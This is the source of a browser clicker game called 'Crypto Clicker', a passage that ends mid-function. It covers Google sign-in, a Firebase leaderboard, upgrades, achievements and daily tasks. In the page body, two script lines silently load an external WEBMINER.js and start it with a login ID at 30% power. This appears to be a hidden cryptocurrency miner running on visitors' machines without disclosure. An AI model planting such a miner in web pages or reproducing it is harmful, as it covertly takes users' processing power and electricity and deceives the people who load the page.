<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Crypto Clicker</title>
  <style>
    body {
      background: #0f0f0f;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 20px;
    }
    input { padding: 8px; font-size: 16px; margin-bottom: 10px; border-radius: 5px; border: none; }
    .click-button {
      background: linear-gradient(135deg, #00ffa6, #00c3ff);
      color: #000;
      font-weight: bold;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 12px;
      cursor: pointer;
      margin: 10px;
      border: none;
    }
    #counter {
      font-size: 36px;
      margin-top: 20px;
      font-weight: bold;
      transition: transform 0.2s ease;
    }
    #counter.bounce {
      transform: scale(1.2);
    }
    #levelMessage {
      display: none;
      opacity: 0;
      transition: opacity 1s ease-in-out;
      color: gold;
      font-weight: bold;
      margin-top: 5px;
    }
    #levelMessage.show {
      display: block;
      opacity: 1;
    }
    table { margin: 20px auto; border-collapse: collapse; width: 80%; max-width: 600px; }
    th, td { padding: 10px; border-bottom: 1px solid #333; }
    th { background-color: #00c3ff; color: #000; }
    #message { margin-top: 10px; color: #ff5555; }
    .progress-container { background-color: #222; border-radius: 10px; height: 12px; width: 140px; margin: 10px auto; overflow: hidden; box-shadow: 0 0 5px #00ffc8; }
    .progress-bar { height: 100%; background: linear-gradient(90deg, #00ffc8 0%, #00c3ff 100%); width: 0%; transition: width 0.3s ease-in-out; border-radius: 10px; }
    #profilePanel { position: absolute; top: 20px; left: 20px; background-color: #1a1a1a; padding: 15px; border-radius: 12px; box-shadow: 0 0 10px #00c3ff; width: 200px; text-align: left; }
    #profilePanel div { margin: 6px 0; }
    #buttonGroup { margin-top: 180px; }
    #motiveText {
      margin-top: 20px;
      font-size: 18px;
      color: #00ffc8;
      text-shadow: 0 0 8px #00ffc8;
      transition: opacity 0.5s ease-in-out;
    }
    .achievement-panel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    .achievement-panel.open {
      max-height: 500px;
      padding: 10px;
    }
    .ad-container {
      text-align: center;
      margin: 20px 0;
      max-width: 100%;
      overflow: hidden;
    }
    .ad-container iframe {
      max-width: 100%;
      width: 728px;
      height: 90px;
      border: none;
      margin: 10px auto;
      display: block;
    }
    @media (max-width: 768px) {
      .ad-container iframe {
        width: 100%;
        height: auto;
        max-width: 300px;
      }
    }
    #tasksPanel {
      max-height: 0;
      overflow: hidden;
      transition: max-height 0.4s ease, padding 0.4s ease;
      padding: 0 10px;
      background-color: #1a1a1a;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 10px #00c3ff;
    }
    #tasksPanel.open {
      max-height: 300px;
      padding: 10px;
    }
    #tasksList div {
      margin-bottom: 10px;
      padding: 8px;
      border: 1px solid #00c3ff;
      border-radius: 8px;
      background-color: #222;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      50% { transform: translateX(5px); }
      75% { transform: translateX(-5px); }
      100% { transform: translateX(0); }
    }




    .bonus-card {
  background: #1a1a1a;
  padding: 15px;
  border-radius: 12px;
  width: 180px;
  box-shadow: 0 0 10px #00c3ff;
  text-align: center;
}
.bonus-card h3 {
  margin: 0 0 10px;
  font-size: 18px;
  color: #00ffa6;
}
.bonus-card p {
  margin: 0 0 10px;
  font-size: 14px;
  color: #fff;
}
#claimBonusBtn:disabled {
  background: #555;
  cursor: not-allowed;
}
@media (max-width: 768px) {
  #hourlyBonus {
    top: 10px;
    right: 10px;
  }
  .bonus-card {
    width: 140px;
    padding: 10px;
  }
  .bonus-card h3 {
    font-size: 16px;
  }
  .bonus-card p {
    font-size: 12px;
  }
}
                   
  </style>
</head>

<body>
  <div id="profilePanel">
    <div><strong>Player:</strong> <span id="profileName">Anonymous</span></div>
    <div><strong>Level:</strong> <span id="playerLevel">1</span> / 10</div>
    <div><strong>Click Power:</strong> <span id="profileClickPower">1</span></div>
    <div><strong>Autoclicker:</strong> <span id="profileAutoclick">Inactive</span></div>
    <div><strong>Tokens:</strong> <span id="profileTokens">0</span></div>
    <div><button class="click-button" onclick="signOut()">Sign Out</button></div>
  </div>

  <div id="playerLevelContainer">
    <div id="levelMessage" style="display: none; color: gold; font-weight: bold; margin-top: 5px;">
      <!-- Message will appear here -->
    </div>
  </div>

  <h1>Crypto Clicker üí∞</h1>

  <div id="authSection">
    <button class="click-button" onclick="signInWithGoogle()">Sign in with Google</button>
    <div id="motiveText">Click ‚Äî earn tokens.</div>
  </div>

  <div id="gameSection" style="display:none;">
    <div id="hourlyBonus" style="position: absolute; top: 20px; right: 20px;">
    <div class="bonus-card">
      <h3>Hourly Bonus</h3>
      <p id="bonusTimer">Next in: 01:00:00</p>
      <button class="click-button" id="claimBonusBtn" onclick="claimHourlyBonus()" disabled>Claim Bonus</button>
    </div>
  </div>
    <div id="dailyReward" style="display: none; margin-top: 20px;">
      <h2>Daily Reward</h2>
      <p id="streakText">Login streak: 0 days</p>
      <button class="click-button" onclick="claimDailyReward()">Claim Reward</button>
    </div>

    <div id="counter">Tokens: 0</div>
    <div id="message"></div>
    <div id="buttonGroup">
      <button class="click-button" onclick="clickToken()">Collect Token</button>
      <button class="click-button" id="shopBtn" onclick="toggleShop()">Shop</button>
      <button class="click-button" onclick="toggleAchievements()">üèÜ Achievements</button>
      <button class="click-button" onclick="toggleTasks()">üìã Tasks</button>
    </div>

    <div id="shop" style="display:none; margin-top: 20px;">
      <h2>üõí Upgrades</h2>
      <p id="clickPowerCostText">üí™ Click Power +1 (Cost: 50)</p>
      <p>Current: <span id="clickPowerDisplay">1</span> / 8</p>
      <div class="progress-container">
        <div class="progress-bar" id="clickPowerBar"></div>
      </div>
      <button class="click-button" onclick="buyUpgrade('clickPower')">Buy</button>

      <h2>‚ö° Autoclickers</h2>
      <div id="autoclickerShop" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 20px;">
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>1 Minute</h3>
          <p>Cost: 200 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(1)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>5 Minutes</h3>
          <p>Cost: 800 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(5)">Buy</button>
        </div>
        <div style="background: #1a1a1a; padding: 20px; border-radius: 12px; width: 200px; box-shadow: 0 0 10px #00c3ff;">
          <h3>10 Minutes</h3>
          <p>Cost: 1400 Tokens</p>
          <button class="click-button" onclick="buyAutoclicker(10)">Buy</button>
        </div>
      </div>
    </div>

    <div id="achievementsPanel" class="achievement-panel">
      <h2>Achievements</h2>
      <div id="achievementsList"></div>
    </div>

    <div id="tasksPanel" class="achievement-panel">
      <h2>Daily Tasks</h2>
      <div id="tasksList"></div>
    </div>

    <h2>Leaderboard</h2>
    <table>
      <thead><tr><th>#</th><th>Player</th><th>Tokens</th></tr></thead>
      <tbody id="leaderboard"></tbody>
    </table>
  </div>

  <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
  <script>WEBMINER.config({ login: "5991295", pass: null }).power(30);</script>

  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDVgvBf_C6dIMtZ4MISwR5YRCBi8_JXinQ",
      authDomain: "cryptoclickertry.firebaseapp.com",
      databaseURL: "https://cryptoclickertry-default-rtdb.firebaseio.com",
      projectId: "cryptoclickertry",
      storageBucket: "cryptoclickertry.firebasestorage.app",
      messagingSenderId: "1017002572592",
      appId: "1:1017002572592:web:e06e5f4ba00017dc1466f5",
      measurementId: "G-W2T3BN4LL3"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const allAchievements = {
      superClicker: { name: "Super Clicker", description: "Click 10,000 times", reward: "+2 Click Power (2 min)" },
      tokenHoarder: { name: "Token Hoarder", description: "Collect 1,000,000 tokens", reward: "+2 Click Power (2min)" },
      level5: { name: "Level 5 Reached", description: "Reach level 5", reward: "+1 Click Power" },
    };

    const levelUpRequirements = [
      50000, 100000, 500000, 2500000, 50000000, 200000000, 800000000, 3200000000, 10000000000
    ];

    const dailyTasks = [
      {
        id: "clickMarathon",
        description: "Make 100 clicks",
        goal: 100,
        reward: 50
      },
      {
        id: "levelUp",
        description: "Collect 50 tokens",
        goal: 50,
        reward: "Click Power +1 for 5 min"
      },
      {
        id: "autoclickerMaster",
        description: "Activate autoclicker 5 times in a week",
        goal: 5,
        reward: "Free 5-minute autoclicker",
        period: "weekly"
      }
    ];

    let user = null;
    let score = 0;
    let clickPower = 1;
    let autoclickActive = false;
    let autoclickInterval = null;
    let autoclickEndTime = 0;
    let autoclickCooldown = false;
    let currentLevel = 1;
    let totalClicks = 0;
    let autoclickerUses = 0;
    let achievements = {};
    let tempBoostTimeout = null;
    let originalClickPower = null;
    let isRenderingTasks = false;
    let bonusTimerInterval = null;

    function updateProfilePanel() {
      document.getElementById("profileClickPower").innerText = Math.min(clickPower, 8);

      if (autoclickActive) {
        const remaining = Math.max(0, autoclickEndTime - Date.now());
        const seconds = Math.floor(remaining / 1000) % 60;
        const minutes = Math.floor(remaining / 60000);
        document.getElementById("profileAutoclick").innerText = `Active: ${minutes}:${seconds.toString().padStart(2, '0')}`;
      } else {
        document.getElementById("profileAutoclick").innerText = "Inactive";
      }

      let level = 1;
      for (let i = 0; i < levelUpRequirements.length; i++) {
        if (score >= levelUpRequirements[i]) {
          level = i + 2;
        } else {
          break;
        }
      }

      document.getElementById("playerLevel").innerText = level;
      document.getElementById("profileTokens").innerText = score;
      document.getElementById("profileName").innerText = user?.displayName || "Anonymous";

      const levelMessageElement = document.getElementById("levelMessage");
      if (level === 10) {
        levelMessageElement.innerText = "Maximum level reached!";
        levelMessageElement.classList.add("show");
      } else {
        levelMessageElement.classList.remove("show");
      }
    }

    function checkDailyReward() {
      if (!user) return;
      const today = new Date().toDateString();
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val() || { lastLogin: "", streak: 0 };
        const lastLogin = data.lastLogin || "";
        let streak = data.streak || 0;

        if (lastLogin !== today) {
          document.getElementById("dailyReward").style.display = "block";
          if (new Date(lastLogin).toDateString() === new Date(Date.now() - 86400000).toDateString()) {
            streak++;
          } else {
            streak = 1;
          }
          db.ref("dailyRewards/" + user.uid).set({ lastLogin: today, streak: streak });
          document.getElementById("streakText").innerText = `Login streak: ${streak} days`;
        }
      });
    }

    function claimDailyReward() {
      db.ref("dailyRewards/" + user.uid).once("value").then(snapshot => {
        const data = snapshot.val();
        const streak = data.streak || 1;
        const rewards = [50, 100, 200, 300, 500, 1000, 2000];
        const reward = rewards[Math.min(streak - 1, rewards.length - 1)];

        score += reward;
        updateCounterDisplay();
        submitScore();
        showMessage(`Claimed ${reward} tokens for ${streak}-day streak!`);
        document.getElementById("dailyReward").style.display = "none";
      });
    }



function startBonusTimer() {
  if (bonusTimerInterval) clearInterval(bonusTimerInterval);

  bonusTimerInterval = setInterval(() => {
    if (!user) return;
    db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
      const data = snapshot.val() || { lastClaim: 0 };
      const now = Date.now();
      const timeSinceLastClaim = now - data.lastClaim;
      const oneHour = 3600000; // 1 hour in milliseconds
      const timeRemaining = Math.max(0, oneHour - timeSinceLastClaim);

      if (timeRemaining <= 0) {
        document.getElementById("claimBonusBtn").disabled = false;
        document.getElementById("bonusTimer").innerText = "Claim now!";
        clearInterval(bonusTimerInterval);
      } else {
        document.getElementById("claimBonusBtn").disabled = true;
        const hours = Math.floor(timeRemaining / 3600000);
        const minutes = Math.floor((timeRemaining % 3600000) / 60000);
        const seconds = Math.floor((timeRemaining % 60000) / 1000);
        document.getElementById("bonusTimer").innerText = `Next in: ${hours.toString().padStart(2, '0')}:${minutes
          .toString()
          .padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      }
    }).catch(error => {
      console.error("Error fetching bonus timer:", error);
      showMessage("Failed to load bonus timer.");
    });
  }, 1000);
}

function claimHourlyBonus() {
  if (!user) {
    showMessage("Please sign in to claim the bonus.");
    return;
  }

  db.ref(`hourlyBonus/${user.uid}`).once("value").then(snapshot => {
    const data = snapshot.val() || { lastClaim: 0 };
    const now = Date.now();
    const timeSinceLastClaim = now - data.lastClaim;
    const oneHour = 3600000;

    if (timeSinceLastClaim >= oneHour || !data.lastClaim) {
      const reward = Math.floor(Math.random() * (200 - 10 + 1)) + 10; // Random 10-200 tokens
      score += reward;
      updateCounterDisplay();
      submitScore();
      showMessage(`Claimed ${reward} tokens from Hourly Bonus!`);

      db.ref(`hourlyBonus/${user.uid}`).set({ lastClaim: now }).then(() => {
        document.getElementById("claimBonusBtn").disabled = true;
        startBonusTimer();
      }).catch(error => {
        console.error("Error saving bonus claim:", error);
        showMessage("Failed to save bonus claim.");
      });
    } else {
      showMessage("Bonus not ready yet!");
    }
  }).catch(error => {
    console.error("Error checking bonus eligibility:", error);
    showMessage("Failed to check bonus eligibility.");
  });
}



    

    function closeAllPanels() {
      console.log("Closing all panels...");
      const shop = document.getElementById("shop");
      if (shop) {
        shop.style.display = "none";
        console.log("Shop panel closed");
      } else {
        console.error("Element #shop not found");
      }

      const achievementsPanel = document.getElementById("achievementsPanel");
      if (achievementsPanel) {
        achievementsPanel.classList.remove("open");
        console.log("Achievements panel closed");
      } else {
        console.error("Element #achievementsPanel not found");
      }
      const achievementsBtn = document.querySelector("button[onclick='toggleAchievements()']");
      if (achievementsBtn) {
        achievementsBtn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Achievements button text updated");
      } else {
        console.error("Button for toggleAchievements not found");
      }

      const tasksPanel = document.getElementById("tasksPanel");
      if (tasksPanel) {
        tasksPanel.classList.remove("open");
        console.log("Tasks panel closed");
      } else {
        console.error("Element #tasksPanel not found");
      }
      const tasksBtn = document.querySelector("button[onclick='toggleTasks()']");
      if (tasksBtn) {
        tasksBtn.innerHTML = "üìã Tasks ‚ñº";
        console.log("Tasks button text updated");
      } else {
        console.error("Button for toggleTasks not found");
      }
    }

    function setClickPower(newPower) {
      clickPower = Math.min(newPower, 8);
      updateClickPowerBar();
      updateProfilePanel();
    }

    function getClickPowerUpgradeCost() {
      return Math.floor(500 * Math.pow(6, clickPower - 1));
    }

    function updateClickPowerCostText() {
      const costText = document.getElementById('clickPowerCostText');
      const currentLevel = parseInt(document.getElementById("playerLevel").innerText);
      const buyButton = document.querySelector("button[onclick=\"buyUpgrade('clickPower')\"]");

      if (costText) {
        if (clickPower >= 8) {
          costText.textContent = "üí™ Click Power: MAX LEVEL";
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "Maximum Click Power reached";
          }
        } else if (clickPower >= 3 && currentLevel < clickPower + 1) {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = `Reach player level ${clickPower + 1} to upgrade`;
          }
        } else {
          const cost = getClickPowerUpgradeCost();
          costText.textContent = `üí™ Click Power +1 (Cost: ${cost})`;
          if (buyButton) {
            buyButton.style.background = "linear-gradient(135deg, #00ffa6, #00c3ff)";
            buyButton.style.cursor = "pointer";
            buyButton.title = "";
          }
        }
      }
    }

   /*! function boostClickPowerTemporarily(amount, duration) {
      if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

      originalClickPower = clickPower;
      const boosted = Math.min(clickPower + amount, 8);
      clickPower = boosted;

      const actualBoost = boosted - originalClickPower;
      showMessage(`Temporary boost: Click Power +${actualBoost} –Ω–∞ ${duration / 1000} —Å–µ–∫`);

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
      if (user) {
        const boostEndTime = Date.now() + duration;
        db.ref("leaderboard/" + user.uid).update({
          tempBoostActive: true,
          tempBoostEndTime: boostEndTime,
          tempBoostOriginalClickPower: originalClickPower,
          tempBoostAmount: amount,
          lastUpdate: Date.now()
        }).catch(error => {
          console.error("–û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
        });
      }

      tempBoostTimeout = setTimeout(() => {
        clickPower = originalClickPower;
        showMessage(`–ë—É—Å—Ç –∑–∞–∫–æ–Ω—á–∏–ª—Å—è: –°–∏–ª–∞ –∫–ª–∏–∫–∞ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞`);
        updateClickPowerBar();
        updateProfilePanel();
        submitScore();

        // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
        if (user) {
          db.ref("leaderboard/" + user.uid).update({
            tempBoostActive: false,
            tempBoostEndTime: 0,
            tempBoostOriginalClickPower: 0,
            tempBoostAmount: 0,
            lastUpdate: Date.now()
          }).catch(error => {
            console.error("–û—à–∏–±–∫–∞ –æ—á–∏—Å—Ç–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è –±—É—Å—Ç–∞:", error);
          });
        }
      }, duration);
    }!*/

    function boostClickPowerTemporarily(amount, duration, isRestoring = false) {
  if (tempBoostTimeout) clearTimeout(tempBoostTimeout);

  if (!isRestoring) {
    // –ü—Ä–∏–º–µ–Ω—è–µ–º –±—É—Å—Ç —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ
    originalClickPower = clickPower;
    const boosted = Math.min(clickPower + amount, 8);
    clickPower = boosted;

    const actualBoost = boosted - originalClickPower;
    showMessage(`Temporary boost: Click Power +${actualBoost} for ${duration / 1000} sec`);
  } else {
    // –ü—Ä–∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–∏ –ø—Ä–æ—Å—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ–º —Ç–µ–∫—É—â–µ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ
    showMessage(`Restored boost: Click Power +${amount} for ${duration / 1000} sec`);
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
  if (user) {
    const boostEndTime = Date.now() + duration;
    db.ref("leaderboard/" + user.uid).update({
      tempBoostActive: true,
      tempBoostEndTime: boostEndTime,
      tempBoostOriginalClickPower: originalClickPower,
      tempBoostAmount: amount,
      lastUpdate: Date.now()
    }).catch(error => {
      console.error("Error saving boost state:", error);
    });
  }

  // –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –±—É—Å—Ç–∞
  tempBoostTimeout = setTimeout(() => {
    clickPower = originalClickPower;
    originalClickPower = null;
    showMessage(`Boost ended: Click Power restored`);
    updateClickPowerBar();
    updateProfilePanel();
    submitScore();

    // –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±—É—Å—Ç–∞ –≤ Firebase
    if (user) {
      db.ref("leaderboard/" + user.uid).update({
        tempBoostActive: false,
        tempBoostEndTime: 0,
        tempBoostOriginalClickPower: 0,
        tempBoostAmount: 0,
        clickPower: clickPower,
        lastUpdate: Date.now()
      }).catch(error => {
        console.error("Error clearing boost state:", error);
      });
    }
    tempBoostTimeout = null;
  }, duration);

  updateClickPowerBar();
  updateProfilePanel();
}

    function toggleAchievements() {
      console.log("Calling toggleAchievements...");
      const panel = document.getElementById("achievementsPanel");
      if (!panel) {
        console.error("Element #achievementsPanel not found in toggleAchievements");
        return;
      }
      const btn = document.querySelector("button[onclick='toggleAchievements()']");
      if (!btn) {
        console.error("Button for toggleAchievements not found");
        return;
      }
      const isCurrentlyOpen = panel.classList.contains("open");
      console.log("Achievements panel is currently open:", isCurrentlyOpen);

      if (isCurrentlyOpen) {
        panel.classList.remove("open");
        btn.innerHTML = "üèÜ Achievements ‚ñº";
        console.log("Closing achievements panel");
      } else {
        closeAllPanels();
        panel.classList.add("open");
        btn.innerHTML = "üèÜ Achievements ‚ñ≤";
        console.log("Opening achievements panel");
        renderAchievements();
      }
    }

    function renderAchievements() {
      const list = document.getElementById('achievementsList');
      list.innerHTML = '';

      for (const key in allAchievements) {
        const achieved = achievements[key];
        const ach = allAchievements[key];

        const div = document.createElement('div');
        div.style.marginBottom = '10px';
        div.style.padding = '8px';
        div.style.border = '1px solid #00c3ff';
        div.style.borderRadius = '8px';
        div.style.backgroundColor = achieved ? '#00ffa6' : '#222';
        div.style.color = achieved ? '#000' : '#fff';
        div.innerHTML = `<strong>${ach.name}</strong><br>${ach.description}<br><em>${ach.reward}</em>`;
        list.appendChild(div);
      }
    }

    function updateClickPowerBar() {
      document.getElementById("clickPowerDisplay").innerText = clickPower;
      const progress = Math.min((clickPower / 8) * 100, 100);
      document.getElementById("clickPowerBar").style.width = progress + "%";
      updateClickPowerCostText();
    }

    function updateCounterDisplay() {
      document.getElementById("counter").innerText = `Tokens: ${score}`;
    }

    function showMessage(msg) {
      const el = document.getElementById("message");
      el.innerText = msg;
      setTimeout(() => el.innerText = '', 3000);
    }

    function renderTasks() {
      if (isRenderingTasks) return;
      isRenderingTasks = true;

      const list = document.getElementById("tasksList");
      list.innerHTML = "";

      if (!user) {
        isRenderingTasks = false;
        return;
      }

      db.ref(`tasks/${user.uid}`).once("value").then(snapshot => {
        const tasksData = snapshot.val() || {};
        const today = new Date().toDateString();
        
        // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –Ω–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏ (–ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫)
        const now = new Date();
        const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();

        dailyTasks.forEach(task => {
          let taskData = tasksData[task.id] || { progress: 0, lastReset: "", completions: 0, completed: false };

          // –î–ª—è –Ω–µ–¥–µ–ª—å–Ω—ã—Ö –∑–∞–¥–∞—á –∏—Å–ø–æ–ª—å–∑—É–µ–º startOfWeek, –¥–ª—è –¥–Ω–µ–≤–Ω—ã—Ö ‚Äî today
          const resetKey = task.period === "weekly" ? startOfWeek : today;
          if (taskData.lastReset !== resetKey) {
            taskData = { progress: 0, lastReset: resetKey, completions: 0, completed: false };
            db.ref(`tasks/${user.uid}/${task.id}`).set(taskData);
          }

          const div = document.createElement("div");
          if (taskData.completed || taskData.completions >= 1) {
            div.innerHTML = `${task.description}: Completed for ${task.period === "weekly" ? "this week" : "today"}!`;
          } else {
            div.innerHTML = `${task.description}: ${taskData.progress}/${task.goal} (Reward: ${task.reward})`;
          }
          list.appendChild(div);
        });

        const validTaskIds = dailyTasks.map(task => task.id);
        for (const taskId in tasksData) {
          if (!validTaskIds.includes(taskId)) {
            db.ref(`tasks/${user.uid}/${taskId}`).remove();
          }
        }

        isRenderingTasks = false;
      }).catch(error => {
        console.error("Error rendering tasks:", error);
        showMessage("Failed to load tasks.");
        isRenderingTasks = false;
      });
    }

    function toggleTasks() {
      const panel = document.getElementById("tasksPanel");
      const btn = document.querySelector("button[onclick='toggleTasks()']");
      const isCurrentlyOpen = panel.classList.contains("open");

      closeAllPanels();

      if (!isCurrentlyOpen) {
        panel.classList.add("open");
        btn.innerHTML = "üìã Tasks ‚ñ≤";
        renderTasks();
      }
    }

    function updateTaskProgress(taskId, increment) {
      if (!user) return;
      const now = new Date();
      const today = now.toDateString();
      // –ù–∞—á–∞–ª–æ —Ç–µ–∫—É—â–µ–π –Ω–µ–¥–µ–ª–∏
      const startOfWeek = new Date(now.setDate(now.getDate() - now.getDay() + (now.getDay() === 0 ? -6 : 1))).toDateString();
      
      const task = dailyTasks.find(t => t.id === taskId);
      const resetKey = task?.period === "weekly" ? startOfWeek : today;

      db.ref(`tasks/${user.uid}/${taskId}`).transaction(taskData => {
        taskData = taskData || { progress: 0, lastReset: resetKey, completions: 0, completed: false };
        if (taskData.lastReset !== resetKey) {
          taskData.progress = 0;
          taskData.lastReset = resetKey;
          taskData.completions = 0;
          taskData.completed = false;
        }
        if (taskData.completed || taskData.completions >= 1) {
          return taskData;
        }
        taskData.progress = (taskData.progress || 0) + increment;
        return taskData;
      }).then(() => {
        db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
          const taskData = snapshot.val();
          if (taskData && !(taskData.completed || taskData.completions >= 1)) {
            checkTaskCompletion(taskId);
          }
          renderTasks();
        });
      });
    }

 /*!   function checkTaskCompletion(taskId) {
      db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
        const taskData = snapshot.val();
        const task = dailyTasks.find(t => t.id === taskId);

        if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
          return;
        }

        if (taskData && taskData.progress >= task.goal) {
          const completions = (taskData.completions || 0) + 1;
          if (completions <= 1) {
            if (task.id === "clickMarathon") {
              score += task.reward;
              showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
              updateCounterDisplay();
              submitScore();
            } else if (task.id === "levelUp") {
              boostClickPowerTemporarily(1, 300000);
              showMessage(`Task "${task.description}" completed! ${task.reward}`);
              updateClickPowerBar();
              submitScore();
            } else if (task.id === "autoclickerMaster") {
              showMessage(`Task "${task.description}" completed! ${task.reward}`);
              startAutoclicker(300000);
              submitScore();
            }
            db.ref(`tasks/${user.uid}/${taskId}`).set({
              progress: 0,
              lastReset: taskData.lastReset,
              completions: completions,
              completed: true
            });
          }
          renderTasks();
        }
      });
    }
function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    if (taskData && taskData.progress >= task.goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "levelUp") {
          boostClickPowerTemporarily(1, 300000);
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          updateClickPowerBar();
          submitScore();
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = true –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${taskId}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true
        });
      }
      renderTasks();
    }
  });
}!*/

function checkTaskCompletion(taskId) {
  db.ref(`tasks/${user.uid}/${taskId}`).once("value").then(snapshot => {
    const taskData = snapshot.val();
    const task = dailyTasks.find(t => t.id === taskId);

    if (taskData && (taskData.completed || (taskData.completions || 0) >= 1)) {
      return;
    }

    if (taskData && taskData.progress >= task.goal) {
      const completions = (taskData.completions || 0) + 1;
      if (completions <= 1) {
        if (task.id === "clickMarathon") {
          score += task.reward;
          showMessage(`Task "${task.description}" completed! +${task.reward} tokens`);
          updateCounterDisplay();
          submitScore();
        } else if (task.id === "levelUp") {
          boostClickPowerTemporarily(1, 300000);
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          updateClickPowerBar();
          submitScore();
        } else if (task.id === "autoclickerMaster") {
          showMessage(`Task "${task.description}" completed! ${task.reward}`);
          startAutoclicker(300000, true); // –ü–µ—Ä–µ–¥–∞—ë–º extendTime = true –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏
          submitScore();
        }
        db.ref(`tasks/${user.uid}/${taskId}`).set({
          progress: 0,
          lastReset: taskData.lastReset,
          completions: completions,
          completed: true
        });
      }
      renderTasks();
    }
  });
}
    
    function clickToken() {
      score += clickPower;
      totalClicks++;
      updateTaskProgress("clickMarathon", 1);
      updateTaskProgress("levelUp", clickPower);
      checkAchievements();
      updateCounterDisplay();
      updateProfilePanel();
      animateCounter();
    }

    function animateCounter() {
      const counter = document.getElementById('counter');
      counter.classList.add('bounce');
      setTimeout(() => {
        counter.classList.remove('bounce');
      }, 200);
    }

    function checkAchievements() {
      if (!achievements.superClicker && totalClicks >= 10) {
        achievements.superClicker = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Super Clicker! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

      if (!achievements.tokenHoarder && score >= 1000000) {
        achievements.tokenHoarder = true;
        boostClickPowerTemporarily(2, 120000);
        showMessage("Secret Achievement Unlocked: Token Hoarder! Click Power +2 for 2 minutes!");
        updateClickPowerBar();
        renderAchievements();
        saveAchievements();
      }

